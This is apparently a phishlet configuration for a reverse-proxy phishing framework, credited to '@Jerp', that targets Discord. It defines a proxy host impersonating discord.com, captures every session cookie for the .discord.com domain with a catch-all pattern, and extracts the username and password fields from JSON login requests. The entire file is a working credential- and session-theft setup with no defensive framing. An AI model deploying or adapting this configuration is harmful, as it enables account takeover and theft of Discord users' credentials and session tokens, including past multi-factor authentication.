author: '@Jerp'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'discord', orig_sub: 'www', domain: 'discord.com', session: true, is_landing: true}

sub_filters:
  - {triggers_on: 'discord.com', orig_sub: 'www', domain: 'discord.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}

auth_tokens:
 - domain: '.discord.com'
   keys: ['.*,regexp']

credentials:
 username:
  key: ''
  search: '"login":"([^"]*)'
  type: 'json'
 password:
  key: ''
  search: '"password":"([^"]*)'
  type: 'json'

login:
  domain: 'www.discord.com'
  path: 'login'
